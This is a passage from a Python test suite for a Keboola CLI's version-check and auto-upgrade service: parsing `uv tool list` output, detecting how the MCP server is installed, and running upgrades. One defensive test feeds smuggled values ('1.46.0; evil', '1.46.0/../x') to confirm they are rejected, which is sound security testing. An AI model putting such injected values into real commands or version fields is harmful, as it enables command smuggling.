"""Tests for VersionService - version detection and update checks."""

import subprocess
from unittest.mock import MagicMock, patch

import pytest

from keboola_agent_cli.constants import MCP_UPGRADE_TIMEOUT
from keboola_agent_cli.services.version_service import (
    MCP_BINARY_NAME,
    MCP_PACKAGE_NAME,
    VersionService,
    _detect_mcp_install_method,
    _fetch_kbagent_latest_version,
    _fetch_mcp_latest_version,
    _get_local_mcp_version,
    _is_up_to_date,
    _is_uvx_available,
    _perform_mcp_update,
    _uv_tool_list_get_mcp_version,
    _uv_tool_list_has_mcp,
    build_kbagent_upgrade_command,
    get_update_timeout,
    resolve_kbagent_wheel_url,
)


class TestIsUvxAvailable:
    """Tests for _is_uvx_available()."""

    @patch("keboola_agent_cli.services.version_service.shutil.which")
    def test_uvx_found(self, mock_which: MagicMock) -> None:
        mock_which.return_value = "/usr/local/bin/uvx"
        assert _is_uvx_available() is True

    @patch("keboola_agent_cli.services.version_service.shutil.which")
    def test_uvx_not_found(self, mock_which: MagicMock) -> None:
        mock_which.return_value = None
        assert _is_uvx_available() is False


class TestFetchMcpLatestVersion:
    """Tests for _fetch_mcp_latest_version()."""

    @patch("keboola_agent_cli.services.version_service.httpx.get")
    def test_success(self, mock_get: MagicMock) -> None:
        mock_response = MagicMock()
        mock_response.json.return_value = {"info": {"version": "1.46.0"}}
        mock_response.raise_for_status = MagicMock()
        mock_get.return_value = mock_response

        assert _fetch_mcp_latest_version() == "1.46.0"

    @patch("keboola_agent_cli.services.version_service.httpx.get")
    def test_rejects_malformed_pypi_version(self, mock_get: MagicMock) -> None:
        """GHSA-x6cx: a malformed PyPI version must be rejected, not accepted on
        a valid prefix (defense-in-depth on the MCP upgrade-command path)."""
        mock_response = MagicMock()
        mock_response.raise_for_status = MagicMock()
        mock_get.return_value = mock_response
        for bad in ("1.46.0; evil", "1.46.0/../x", "garbage"):
            mock_response.json.return_value = {"info": {"version": bad}}
            assert _fetch_mcp_latest_version() is None, bad

    @patch("keboola_agent_cli.services.version_service.httpx.get")
    def test_http_error(self, mock_get: MagicMock) -> None:
        import httpx

        mock_get.side_effect = httpx.HTTPError("connection failed")
        assert _fetch_mcp_latest_version() is None


class TestIsUpToDate:
    """Tests for _is_up_to_date()."""

    def test_same_version(self) -> None:
        assert _is_up_to_date("2.44.0", "2.44.0") is True

    def test_newer_available(self) -> None:
        assert _is_up_to_date("2.44.0", "2.44.2") is False

    def test_local_newer(self) -> None:
        assert _is_up_to_date("2.45.0", "2.44.2") is True

    def test_local_none(self) -> None:
        assert _is_up_to_date(None, "2.44.2") is None

    def test_latest_none(self) -> None:
        assert _is_up_to_date("2.44.0", None) is None

    def test_both_none(self) -> None:
        assert _is_up_to_date(None, None) is None

    def test_invalid_version(self) -> None:
        assert _is_up_to_date("not-a-version", "2.44.0") is None


class TestVersionService:
    """Tests for VersionService.get_versions()."""

    @pytest.fixture(autouse=True)
    def _no_real_mcp_probe(self):
        """Stub out the MCP detection helpers to avoid real subprocess calls."""
        with (
            patch(
                "keboola_agent_cli.services.version_service._get_local_mcp_version",
                return_value="1.46.0",
            ),
            patch(
                "keboola_agent_cli.services.version_service._detect_mcp_install_method",
                return_value="uv_tool",
            ),
        ):
            yield

    @patch("keboola_agent_cli.services.version_service._fetch_mcp_latest_version")
    @patch("keboola_agent_cli.services.version_service._is_uvx_available")
    def test_mcp_auto_updates(
        self,
        mock_uvx: MagicMock,
        mock_mcp_latest: MagicMock,
    ) -> None:
        mock_uvx.return_value = True
        mock_mcp_latest.return_value = "1.46.0"

        svc = VersionService()
        result = svc.get_versions()

        assert result["kbagent"]["version"] is not None
        deps = result["dependencies"]
        assert len(deps) == 1

        mcp_dep = deps[0]
        assert mcp_dep["name"] == "keboola-mcp-server"
        assert mcp_dep["auto_updates"] is True
        assert mcp_dep["uvx_available"] is True
        assert mcp_dep["latest_version"] == "1.46.0"
        # New fields (since v0.30.1)
        assert mcp_dep["version"] == "1.46.0"
        assert mcp_dep["up_to_date"] is True
        assert mcp_dep["install_method"] == "uv_tool"
        assert "uv tool upgrade" in mcp_dep["upgrade_command"]
        # issue #324: a copy-pasted command without the opt-in fails the
        # same way the auto-update does.
        assert "--prerelease=allow" in mcp_dep["upgrade_command"]

    @patch("keboola_agent_cli.services.version_service._fetch_mcp_latest_version")
    @patch("keboola_agent_cli.services.version_service._is_uvx_available")
    @patch("keboola_agent_cli.services.version_service._get_local_mcp_version")
    @patch("keboola_agent_cli.services.version_service._detect_mcp_install_method")
    def test_uvx_user_facing_command_uses_uv_tool_install(
        self,
        mock_detect: MagicMock,
        mock_local: MagicMock,
        mock_uvx: MagicMock,
        mock_mcp_latest: MagicMock,
    ) -> None:
        """B-1 regression: when install_method=='uvx', the user-facing
        upgrade_command must NOT recommend the broken `uvx --refresh ...
        <bin> --version` chain (which Bug B removed from the upgrade
        logic). It must point at the same `uv tool install --upgrade`
        the production code now runs internally.
        """
        mock_uvx.return_value = True
        mock_mcp_latest.return_value = "1.59.1"
        mock_local.return_value = "1.49.0"
        mock_detect.return_value = "uvx"

        svc = VersionService()
        result = svc.get_versions()

        mcp_dep = result["dependencies"][0]
        assert mcp_dep["install_method"] == "uvx"
        # The user-facing recommendation must match the runtime upgrade.
        assert "uv tool install --upgrade" in mcp_dep["upgrade_command"]
        # The pre-fix broken arg must NOT appear -- it does not work.
        assert "--version" not in mcp_dep["upgrade_command"]
        # issue #324: pre-release opt-in must be present here too.
        assert "--prerelease=allow" in mcp_dep["upgrade_command"]

    @patch("keboola_agent_cli.services.version_service._fetch_mcp_latest_version")
    @patch("keboola_agent_cli.services.version_service._is_uvx_available")
    def test_uvx_not_available(
        self,
        mock_uvx: MagicMock,
        mock_mcp_latest: MagicMock,
    ) -> None:
        mock_uvx.return_value = False
        mock_mcp_latest.return_value = "1.46.0"

        svc = VersionService()
        result = svc.get_versions()

        mcp_dep = result["dependencies"][0]
        assert mcp_dep["uvx_available"] is False

    @patch("keboola_agent_cli.services.version_service._fetch_mcp_latest_version")
    @patch("keboola_agent_cli.services.version_service._is_uvx_available")
    def test_remote_check_fails(
        self,
        mock_uvx: MagicMock,
        mock_mcp_latest: MagicMock,
    ) -> None:
        mock_uvx.return_value = True
        mock_mcp_latest.return_value = None

        svc = VersionService()
        result = svc.get_versions()

        mcp_dep = result["dependencies"][0]
        assert mcp_dep["latest_version"] is None
        assert mcp_dep["up_to_date"] is None  # cannot compare without latest

    @patch("keboola_agent_cli.auto_update._write_cache")
    @patch("keboola_agent_cli.services.version_service._fetch_kbagent_latest_version")
    @patch("keboola_agent_cli.services.version_service._fetch_mcp_latest_version")
    @patch("keboola_agent_cli.services.version_service._is_uvx_available")
    def test_persists_freshly_fetched_versions_to_cache(
        self,
        mock_uvx: MagicMock,
        mock_mcp_latest: MagicMock,
        mock_kbagent_latest: MagicMock,
        mock_write_cache: MagicMock,
    ) -> None:
        """Bug fix (v0.41.1): ``get_versions()`` must persist the freshly-fetched
        ``latest_version`` (and MCP fields) to the auto-update cache.

        Before v0.41.1, ``kbagent version`` bypassed the cache entirely. The
        symptom: ``kbagent version`` would correctly show ``v0.41.0 available``
        (live fetch from GitHub), but a follow-up ``kbagent serve --ui`` on the
        same machine would still auto-update to whatever stale value the
        1-hour-TTL'd cache held (e.g. 0.40.3). Two commands, two different
        answers to the same question; users got a kbagent older than what
        their version check claimed was newest.
        """
        mock_uvx.return_value = True
        mock_kbagent_latest.return_value = "9.9.9"
        mock_mcp_latest.return_value = "1.99.0"

        svc = VersionService()
        result = svc.get_versions()

        # Verify the cache write actually happened with the new values.
        mock_write_cache.assert_called_once()
        call_kwargs = mock_write_cache.call_args.kwargs
        assert call_kwargs["latest_version"] == "9.9.9"
        assert call_kwargs["mcp_latest_version"] == "1.99.0"
        # mcp_install_method is mocked to "uv_tool" by the autouse fixture.
        assert call_kwargs["mcp_install_method"] == "uv_tool"

        # And the returned dict still has the same values.
        assert result["kbagent"]["latest_version"] == "9.9.9"
        assert result["dependencies"][0]["latest_version"] == "1.99.0"

    @patch("keboola_agent_cli.auto_update._write_cache", side_effect=OSError("disk full"))
    @patch("keboola_agent_cli.services.version_service._fetch_kbagent_latest_version")
    @patch("keboola_agent_cli.services.version_service._fetch_mcp_latest_version")
    @patch("keboola_agent_cli.services.version_service._is_uvx_available")
    def test_cache_write_failure_does_not_break_get_versions(
        self,
        mock_uvx: MagicMock,
        mock_mcp_latest: MagicMock,
        mock_kbagent_latest: MagicMock,
        mock_write_cache: MagicMock,
    ) -> None:
        """Cache write is best-effort: a write failure must NOT break the
        version command. The user sees the version info; the cache just
        won't be refreshed on this run."""
        mock_uvx.return_value = True
        mock_kbagent_latest.return_value = "9.9.9"
        mock_mcp_latest.return_value = "1.99.0"

        svc = VersionService()
        result = svc.get_versions()  # must NOT raise

        # The result is still well-formed despite the cache write failing.
        assert result["kbagent"]["latest_version"] == "9.9.9"
        assert result["dependencies"][0]["latest_version"] == "1.99.0"


# ---------------------------------------------------------------------------
# _get_local_mcp_version (since v0.30.1)
# ---------------------------------------------------------------------------


class TestGetLocalMcpVersion:
    """Tests for the local-MCP-version detection helper.

    Since v0.30.2 the resolution order is ``uv tool list`` -> importlib.metadata
    -> ``keboola_mcp_server --version`` (best-effort future fallback). The
    upstream binary today does NOT honour ``--version`` and instead prints
    its usage block; the path therefore yields no match by design.
    """

    @patch("keboola_agent_cli.services.version_service.shutil.which")
    @patch("keboola_agent_cli.services.version_service.subprocess.run")
    def test_uv_tool_list_returns_version(self, mock_run: MagicMock, mock_which: MagicMock) -> None:
        """Preferred path: read version straight from `uv tool list` output.

        This is the v0.30.2 fix path -- the previous --version probe
        returned None because the upstream binary has no --version flag.
        """
        mock_which.side_effect = lambda c: "/usr/local/bin/uv" if c == "uv" else None
        mock_run.return_value = MagicMock(
            returncode=0,
            stdout=(
                f"keboola-cli v0.30.1\n- kbagent\n{MCP_PACKAGE_NAME} v1.59.1\n- {MCP_BINARY_NAME}\n"
            ),
            stderr="",
        )
        assert _get_local_mcp_version() == "1.59.1"

    @patch("keboola_agent_cli.services.version_service.shutil.which", return_value=None)
    def test_no_uv_no_binary_no_metadata_returns_none(self, mock_which: MagicMock) -> None:
        """All three resolution paths fail -> None."""
        with patch(
            "importlib.metadata.version",
            side_effect=__import__("importlib.metadata").metadata.PackageNotFoundError(
                MCP_PACKAGE_NAME
            ),
        ):
            assert _get_local_mcp_version() is None

    @patch("keboola_agent_cli.services.version_service.shutil.which")
    @patch(
        "keboola_agent_cli.services.version_service.subprocess.run",
        side_effect=subprocess.TimeoutExpired(cmd="x", timeout=5),
    )
    def test_uv_tool_list_timeout_falls_through(
        self, mock_run: MagicMock, mock_which: MagicMock
    ) -> None:
        """`uv tool list` timeout does not crash; falls through to next path."""
        mock_which.return_value = "/usr/local/bin/uv"
        with patch(
            "importlib.metadata.version",
            side_effect=__import__("importlib.metadata").metadata.PackageNotFoundError(
                MCP_PACKAGE_NAME
            ),
        ):
            assert _get_local_mcp_version() is None

    @patch("keboola_agent_cli.services.version_service.shutil.which")
    @patch("keboola_agent_cli.services.version_service.subprocess.run")
    def test_real_world_no_version_flag_returns_none(
        self, mock_run: MagicMock, mock_which: MagicMock
    ) -> None:
        """Regression: keboola_mcp_server --version prints USAGE help, not a version.

        Pre-v0.30.2 the --version path picked the python3 minor (e.g. 3.12)
        out of the usage line and returned the wrong value, OR returned None
        when the regex required X.Y.Z. Lock the contract: the binary's
        usage-help output must NOT yield a spurious version match.
        """
        # Use the actual upstream output verbatim (verified locally on v1.59.1).
        usage_output = (
            "usage: python -m keboola-mcp-server [-h]\n"
            "                                    [--transport {stdio,streamable-http,http-compat}]\n"
            "                                    [--log-level {DEBUG,INFO,WARNING,ERROR,CRITICAL}]\n"
        )
        # uv unavailable so we land on the binary path.
        mock_which.side_effect = lambda c: (
            f"/usr/local/bin/{MCP_BINARY_NAME}" if c == MCP_BINARY_NAME else None
        )
        mock_run.return_value = MagicMock(returncode=0, stdout=usage_output, stderr="")

        with patch(
            "importlib.metadata.version",
            side_effect=__import__("importlib.metadata").metadata.PackageNotFoundError(
                MCP_PACKAGE_NAME
            ),
        ):
            # The 3.12 in "python3.12" inside a usage line must NOT be returned.
            # Since v0.30.2 the cleaned-output filter strips usage: lines.
            assert _get_local_mcp_version() is None

    @patch("keboola_agent_cli.services.version_service.shutil.which")
    @patch("keboola_agent_cli.services.version_service.subprocess.run")
    def test_future_binary_with_version_flag(
        self, mock_run: MagicMock, mock_which: MagicMock
    ) -> None:
        """Forward-compat: when a future MCP server adds --version, we read it.

        Locks the fallback path so we do not silently lose this capability
        once the upstream binary catches up.
        """
        mock_which.side_effect = lambda c: (
            f"/usr/local/bin/{MCP_BINARY_NAME}" if c == MCP_BINARY_NAME else None
        )
        mock_run.return_value = MagicMock(
            returncode=0, stdout="keboola_mcp_server 2.0.0\n", stderr=""
        )
        with patch(
            "importlib.metadata.version",
            side_effect=__import__("importlib.metadata").metadata.PackageNotFoundError(
                MCP_PACKAGE_NAME
            ),
        ):
            assert _get_local_mcp_version() == "2.0.0"


# ---------------------------------------------------------------------------
# _uv_tool_list_get_mcp_version -- version extractor (since v0.30.2)
# ---------------------------------------------------------------------------


class TestUvToolListGetMcpVersion:
    """Tests for the version extractor pulled out of `uv tool list` output."""

    def test_exact_match_returns_version(self) -> None:
        stdout = f"{MCP_PACKAGE_NAME} v1.59.1\n- {MCP_BINARY_NAME}\n"
        assert _uv_tool_list_get_mcp_version(stdout) == "1.59.1"

    def test_real_world_uv_tool_list_output(self) -> None:
        """Regression: the exact format `uv tool list` emits (multi-tool case)."""
        stdout = (
            "agnes-the-ai-analyst v2.1.0\n"
            "- da\n"
            "juncture v0.41.3\n"
            "- juncture\n"
            "keboola-cli v0.30.1\n"
            "- kbagent\n"
            f"{MCP_PACKAGE_NAME} v1.59.1\n"
            f"- {MCP_BINARY_NAME}\n"
        )
        assert _uv_tool_list_get_mcp_version(stdout) == "1.59.1"

    def test_not_listed_returns_none(self) -> None:
        stdout = "keboola-cli v0.30.1\n- kbagent\n"
        assert _uv_tool_list_get_mcp_version(stdout) is None

    def test_similar_named_package_rejected(self) -> None:
        """`keboola-mcp-server-foo` is NOT the package; reject."""
        stdout = "keboola-mcp-server-foo v0.1.0\n- foo-bin\n"
        assert _uv_tool_list_get_mcp_version(stdout) is None

    def test_indented_binary_line_ignored(self) -> None:
        """Indented `- keboola-mcp-server` under another tool must NOT match."""
        stdout = "some-other-tool v1.0.0\n    - keboola-mcp-server-helper\n"
        assert _uv_tool_list_get_mcp_version(stdout) is None

    def test_malformed_version_token_rejected(self) -> None:
        """Second token must look like vX.Y.Z; otherwise None."""
        stdout = f"{MCP_PACKAGE_NAME} not-a-version\n- {MCP_BINARY_NAME}\n"
        assert _uv_tool_list_get_mcp_version(stdout) is None

    def test_strips_leading_v(self) -> None:
        stdout = f"{MCP_PACKAGE_NAME} v2.0.0\n- {MCP_BINARY_NAME}\n"
        assert _uv_tool_list_get_mcp_version(stdout) == "2.0.0"

    def test_pre_release_version(self) -> None:
        """Tolerate suffixes like `v1.59.1.dev0` (uv may include pre-release tags)."""
        stdout = f"{MCP_PACKAGE_NAME} v1.59.1.dev0\n- {MCP_BINARY_NAME}\n"
        # Returns the X.Y.Z prefix; suffix is ignored by the regex anchor.
        assert _uv_tool_list_get_mcp_version(stdout) == "1.59.1.dev0"

    def test_empty_input(self) -> None:
        assert _uv_tool_list_get_mcp_version("") is None


# ---------------------------------------------------------------------------
# _uv_tool_list_has_mcp -- robust parser (B-2 fix, since v0.30.1)
# ---------------------------------------------------------------------------


class TestUvToolListHasMcp:
    """Tests for the robust ``uv tool list`` parser.

    Pre-fix: ``MCP_PACKAGE_NAME in stdout`` would substring-match
    similarly-named tools, indented binary listings, and even hint /
    warning text. The new parser does per-line, exact first-token
    equality.
    """

    def test_exact_package_match(self) -> None:
        stdout = f"{MCP_PACKAGE_NAME} v1.59.1\n- {MCP_BINARY_NAME}\n"
        assert _uv_tool_list_has_mcp(stdout) is True

    def test_no_match_when_only_indented_binary_line(self) -> None:
        """Pre-fix `keboola-mcp-server` substring would also live in the
        binary line `- keboola_mcp_server` (different tool's listing).
        After the fix, indented lines are skipped.
        """
        stdout = "some-other-tool v1.0.0\n    - keboola_mcp_server_helper\n"
        assert _uv_tool_list_has_mcp(stdout) is False

    def test_no_match_for_similar_named_package(self) -> None:
        """A hypothetical `keboola-mcp-server-foo` would substring-match
        but is NOT the same tool. Exact first-token equality rejects it.
        """
        stdout = "keboola-mcp-server-foo v0.1.0\n- foo-bin\n"
        assert _uv_tool_list_has_mcp(stdout) is False

    def test_match_with_other_tools_listed(self) -> None:
        """The package is found alongside other unrelated tools."""
        stdout = (
            "keboola-cli v0.30.0\n"
            "- kbagent\n"
            f"{MCP_PACKAGE_NAME} v1.59.1\n"
            f"- {MCP_BINARY_NAME}\n"
            "ruff v0.1.0\n"
            "- ruff\n"
        )
        assert _uv_tool_list_has_mcp(stdout) is True

    def test_empty_input(self) -> None:
        assert _uv_tool_list_has_mcp("") is False

    def test_blank_lines_only(self) -> None:
        assert _uv_tool_list_has_mcp("\n\n   \n\t\n") is False

    def test_trailing_whitespace_does_not_break_match(self) -> None:
        stdout = f"{MCP_PACKAGE_NAME}   v1.59.1   \n"
        assert _uv_tool_list_has_mcp(stdout) is True


# ---------------------------------------------------------------------------
# _detect_mcp_install_method (since v0.30.1)
# ---------------------------------------------------------------------------


class TestDetectMcpInstallMethod:
    """Tests for the MCP-install-method detector."""

    @patch("keboola_agent_cli.services.version_service.shutil.which")
    @patch("keboola_agent_cli.services.version_service.subprocess.run")
    def test_uv_tool(self, mock_run: MagicMock, mock_which: MagicMock) -> None:
        mock_which.side_effect = lambda c: {
            MCP_BINARY_NAME: f"/home/user/.local/bin/{MCP_BINARY_NAME}",
            "uv": "/usr/local/bin/uv",
        }.get(c)
        mock_run.return_value = MagicMock(
            returncode=0,
            stdout=f"{MCP_PACKAGE_NAME} v1.59.1\n",
            stderr="",
        )
        assert _detect_mcp_install_method() == "uv_tool"

    @patch("keboola_agent_cli.services.version_service.shutil.which")
    @patch("keboola_agent_cli.services.version_service.subprocess.run")
    def test_pip_env_when_binary_present_but_not_in_uv_tool(
        self, mock_run: MagicMock, mock_which: MagicMock
    ) -> None:
        mock_which.side_effect = lambda c: {
            MCP_BINARY_NAME: f"/usr/local/bin/{MCP_BINARY_NAME}",
            "uv": "/usr/local/bin/uv",
        }.get(c)
        mock_run.return_value = MagicMock(returncode=0, stdout="other-tool v1.0.0\n", stderr="")
        assert _detect_mcp_install_method() == "pip_env"

    @patch("keboola_agent_cli.services.version_service.shutil.which", return_value=None)
    def test_uvx_fallback(self, mock_which: MagicMock) -> None:
        # Two passes through which: fail for binary + uv, succeed for uvx.
        mock_which.side_effect = lambda c: "/usr/local/bin/uvx" if c == "uvx" else None
        with patch(
            "importlib.metadata.distribution",
            side_effect=__import__("importlib.metadata").metadata.PackageNotFoundError(
                MCP_PACKAGE_NAME
            ),
        ):
            assert _detect_mcp_install_method() == "uvx"

    @patch("keboola_agent_cli.services.version_service.shutil.which", return_value=None)
    def test_none_when_nothing_available(self, mock_which: MagicMock) -> None:
        with patch(
            "importlib.metadata.distribution",
            side_effect=__import__("importlib.metadata").metadata.PackageNotFoundError(
                MCP_PACKAGE_NAME
            ),
        ):
            assert _detect_mcp_install_method() == "none"


# ---------------------------------------------------------------------------
# _perform_mcp_update (since v0.30.1)
# ---------------------------------------------------------------------------


class TestPerformMcpUpdate:
    """Tests for ``_perform_mcp_update``."""

    @patch("keboola_agent_cli.services.version_service.shutil.which")
    @patch("keboola_agent_cli.services.version_service.subprocess.run")
    def test_uv_tool_success(self, mock_run: MagicMock, mock_which: MagicMock) -> None:
        mock_which.return_value = "/usr/local/bin/uv"
        mock_run.return_value = MagicMock(returncode=0, stdout="upgraded", stderr="")
        ok, info = _perform_mcp_update(method="uv_tool")
        assert ok is True
        assert "upgraded" in info
        # Verify the command shape we are about to run.
        cmd = mock_run.call_args.args[0]
        assert "tool" in cmd and "upgrade" in cmd and MCP_PACKAGE_NAME in cmd
        # issue #324: the pre-release opt-in is mandatory -- without it uv
        # backtracks to a stale MCP (toon-format~=0.9.0b1 pin) and exits 0.
        assert "--prerelease=allow" in cmd

    @patch("keboola_agent_cli.services.version_service.shutil.which")
    @patch("keboola_agent_cli.services.version_service.subprocess.run")
    def test_pip_env_success(self, mock_run: MagicMock, mock_which: MagicMock) -> None:
        mock_which.return_value = "/usr/local/bin/pip"
        mock_run.return_value = MagicMock(returncode=0, stdout="upgraded via pip", stderr="")
        ok, _info = _perform_mcp_update(method="pip_env")
        assert ok is True
        cmd = mock_run.call_args.args[0]
        assert "install" in cmd and "--upgrade" in cmd
        # issue #324: pip's pre-release opt-in flag is --pre.
        assert "--pre" in cmd

    @patch("keboola_agent_cli.services.version_service.shutil.which")
    @patch("keboola_agent_cli.services.version_service.subprocess.run")
    def test_uvx_promotes_to_uv_tool_install(
        self, mock_run: MagicMock, mock_which: MagicMock
    ) -> None:
        """Bug B fix from issue #263: uvx-cache install is promoted to a
        persistent ``uv tool install --upgrade``.

        Pre-fix: command was ``uvx --refresh --from <pkg> <bin> --version``,
        which failed because the upstream MCP binary does not honour
        ``--version``. The cache refresh succeeded but the trailing
        --version probe exited non-zero, so the upgrade banner reported
        failure even though the refresh worked.

        Post-fix: command is ``uv tool install --upgrade <pkg>``, which
        equivalent-refreshes AND moves the binary to PATH so subsequent
        runs use the faster ``uv_tool`` detection path.
        """
        mock_which.return_value = "/usr/local/bin/uv"
        mock_run.return_value = MagicMock(returncode=0, stdout="installed", stderr="")
        ok, _info = _perform_mcp_update(method="uvx")
        assert ok is True
        cmd = mock_run.call_args.args[0]
        assert "tool" in cmd and "install" in cmd and "--upgrade" in cmd
        assert MCP_PACKAGE_NAME in cmd
        # The broken --version arg must be GONE from the uvx upgrade path.
        assert "--version" not in cmd
        # issue #324: the uvx->uv-tool promotion must also opt into pre-releases.
        assert "--prerelease=allow" in cmd

    @patch("keboola_agent_cli.services.version_service.shutil.which", return_value=None)
    def test_uvx_promotion_requires_uv(self, mock_which: MagicMock) -> None:
        """If the uvx promotion needs `uv` and `uv` is missing, fail clearly."""
        ok, info = _perform_mcp_update(method="uvx")
        assert ok is False
        assert "uv not found" in info

    def test_none_returns_false(self) -> None:
        ok, info = _perform_mcp_update(method="none")
        assert ok is False
        assert "not installed" in info

    @patch("keboola_agent_cli.services.version_service.shutil.which")
    @patch(
        "keboola_agent_cli.services.version_service.subprocess.run",
        side_effect=subprocess.TimeoutExpired(cmd="x", timeout=MCP_UPGRADE_TIMEOUT),
    )
    def test_timeout(self, mock_run: MagicMock, mock_which: MagicMock) -> None:
        mock_which.return_value = "/usr/local/bin/uv"
        ok, info = _perform_mcp_update(method="uv_tool", timeout=MCP_UPGRADE_TIMEOUT)
        assert ok is False
        assert "timed out" in info


# ---------------------------------------------------------------------------
# VersionService.self_update -- two-stage upgrade (since v0.30.1)
# ---------------------------------------------------------------------------


class TestSelfUpdateTwoStage:
    """Tests for the kbagent + MCP combined upgrade path."""

    @patch("keboola_agent_cli.services.version_service._fetch_kbagent_latest_version")
    @patch("keboola_agent_cli.services.version_service._fetch_mcp_latest_version")
    @patch("keboola_agent_cli.services.version_service._get_local_mcp_version")
    @patch("keboola_agent_cli.services.version_service._detect_mcp_install_method")
    @patch("keboola_agent_cli.services.version_service._perform_mcp_update")
    def test_both_up_to_date_no_subprocesses(
        self,
        mock_perform: MagicMock,
        mock_detect: MagicMock,
        mock_local: MagicMock,
        mock_mcp_latest: MagicMock,
        mock_kbagent_latest: MagicMock,
    ) -> None:
        from keboola_agent_cli import __version__

        mock_kbagent_latest.return_value = __version__
        mock_mcp_latest.return_value = "1.59.1"
        mock_local.return_value = "1.59.1"
        mock_detect.return_value = "uv_tool"

        svc = VersionService()
        result = svc.self_update()

        assert result["updated"] is False
        assert result["kbagent"]["updated"] is False
        assert result["mcp"]["updated"] is False
        mock_perform.assert_not_called()

    @patch("keboola_agent_cli.services.version_service._fetch_kbagent_latest_version")
    @patch("keboola_agent_cli.services.version_service._fetch_mcp_latest_version")
    @patch("keboola_agent_cli.services.version_service._get_local_mcp_version")
    @patch("keboola_agent_cli.services.version_service._detect_mcp_install_method")
    @patch("keboola_agent_cli.services.version_service._perform_mcp_update")
    def test_only_mcp_stale_kbagent_uptodate_still_runs_mcp(
        self,
        mock_perform: MagicMock,
        mock_detect: MagicMock,
        mock_local: MagicMock,
        mock_mcp_latest: MagicMock,
        mock_kbagent_latest: MagicMock,
    ) -> None:
        from keboola_agent_cli import __version__

        mock_kbagent_latest.return_value = __version__  # kbagent up-to-date
        mock_mcp_latest.return_value = "1.59.1"
        # Bug E fix: pre-upgrade returns 1.49.0; post-upgrade returns 1.59.1.
        # The version delta is what flips `updated` to True (not just the
        # subprocess exit code). Side-effect list models the two calls.
        mock_local.side_effect = ["1.49.0", "1.59.1"]
        mock_detect.return_value = "uv_tool"
        mock_perform.return_value = (True, "ok")

        svc = VersionService()
        result = svc.self_update()

        # Critical: kbagent up-to-date does NOT short-circuit MCP stage.
        assert result["mcp"]["updated"] is True
        assert result["updated"] is True
        mock_perform.assert_called_once()

    @patch("keboola_agent_cli.services.version_service._fetch_kbagent_latest_version")
    @patch("keboola_agent_cli.services.version_service._fetch_mcp_latest_version")
    @patch("keboola_agent_cli.services.version_service._get_local_mcp_version")
    @patch("keboola_agent_cli.services.version_service._detect_mcp_install_method")
    @patch("keboola_agent_cli.services.version_service._perform_mcp_update")
    def test_subprocess_succeeds_but_version_unchanged_reports_not_updated(
        self,
        mock_perform: MagicMock,
        mock_detect: MagicMock,
        mock_local: MagicMock,
        mock_mcp_latest: MagicMock,
        mock_kbagent_latest: MagicMock,
    ) -> None:
        """Bug E regression from issue #263.

        Real reproducer (from @ottomansky's trace on v0.30.2):
        ``uv tool upgrade keboola-mcp-server`` exits 0, but uv's
        resolver backtracked to the previously installed v1.32.0
        because v1.59.1 declares a fastmcp constraint the venv cannot
        satisfy. Pre-fix: kbagent reported success and the message
        said "Upgraded keboola-mcp-server (1.32.0 -> 1.32.0)". Post-fix:
        ``updated`` is False, message contains a diagnostic pointing to
        ``uv tool install --reinstall`` with no false-success claim.
        """
        from keboola_agent_cli import __version__

        mock_kbagent_latest.return_value = __version__
        mock_mcp_latest.return_value = "1.59.1"
        # Both pre and post probes return v1.32.0 -- subprocess "succeeded"
        # but the version did not change.
        mock_local.side_effect = ["1.32.0", "1.32.0"]
        mock_detect.return_value = "uv_tool"
        mock_perform.return_value = (True, "no upgrade needed")

        svc = VersionService()
        result = svc.self_update()

        # The lie -- "subprocess exit 0 = upgrade happened" -- is the bug.
        # Truth: pre and post versions are identical, so updated == False.
        assert result["mcp"]["updated"] is False
        # Diagnostic message points the user at `uv tool install --reinstall`
        # so they can investigate the underlying packaging conflict.
        assert "still v1.32.0" in result["mcp"]["message"]
        assert "uv tool install --reinstall" in result["mcp"]["message"]
        # The overall `updated` flag also reflects no change (kbagent itself
        # was up-to-date in this scenario).
        assert result["updated"] is False

    @patch("keboola_agent_cli.services.version_service._fetch_kbagent_latest_version")
    @patch("keboola_agent_cli.services.version_service._fetch_mcp_latest_version")
    @patch("keboola_agent_cli.services.version_service._get_local_mcp_version")
    @patch("keboola_agent_cli.services.version_service._detect_mcp_install_method")
    @patch("keboola_agent_cli.services.version_service._perform_mcp_update")
    def test_fresh_install_pre_none_post_set_reports_updated(
        self,
        mock_perform: MagicMock,
        mock_detect: MagicMock,
        mock_local: MagicMock,
        mock_mcp_latest: MagicMock,
        mock_kbagent_latest: MagicMock,
    ) -> None:
        """B-2 regression: explicit `kbagent update` on a host that has
        no MCP installed yet (`local_version=None`). Pre-fix, the Bug E
        guard's `local_version and ...` short-circuited on the falsy
        local_version, so a successful fresh install was reported as
        ``updated: False`` with a "still vNone" diagnostic message.

        Post-fix, the guard treats `local_version=None and post_version
        is set` as a fresh install -> `actually_updated=True`. The
        message reads "(unknown -> 1.59.1)" which is correct.

        The auto-update startup path (`_maybe_update_mcp`) does NOT hit
        this case because Bug C's `if local_version is None: return`
        gate intentionally skips fresh installs on startup -- the user
        must run `kbagent update` (or `kbagent doctor --fix`) explicitly.
        """
        from keboola_agent_cli import __version__

        mock_kbagent_latest.return_value = __version__
        mock_mcp_latest.return_value = "1.59.1"
        # Pre: not installed (None). Post: installed (1.59.1). The
        # explicit update worked.
        mock_local.side_effect = [None, "1.59.1"]
        mock_detect.return_value = "uv_tool"
        mock_perform.return_value = (True, "installed")

        svc = VersionService()
        result = svc.self_update()

        # The legitimate fresh-install case: updated must be True.
        assert result["mcp"]["updated"] is True
        assert result["mcp"]["current_version"] is None
        assert result["mcp"]["post_upgrade_version"] == "1.59.1"
        # Message must not say "still vNone" (the pre-fix lie).
        assert "still v" not in result["mcp"]["message"]
        assert "vNone" not in result["mcp"]["message"]
        # Overall flag flips to True too.
        assert result["updated"] is True


class TestFetchKbagentLatestVersion:
    """Beta / pre-release opt-in for kbagent version lookup (since v0.42.0)."""

    @patch("keboola_agent_cli.services.version_service.httpx.get")
    def test_default_uses_releases_latest_endpoint(self, mock_get: MagicMock) -> None:
        """Without --beta: hit /releases/latest (GitHub filters prerelease)."""
        mock_response = MagicMock()
        mock_response.json.return_value = {"tag_name": "v0.42.0"}
        mock_response.raise_for_status = MagicMock()
        mock_get.return_value = mock_response

        result = _fetch_kbagent_latest_version()

        assert result == "0.42.0"
        # Only one call, to /releases/latest -- the prerelease path uses
        # /releases (plural) instead.
        assert mock_get.call_count == 1
        url = mock_get.call_args.args[0]
        assert url.endswith("/releases/latest")

    @patch("keboola_agent_cli.services.version_service.httpx.get")
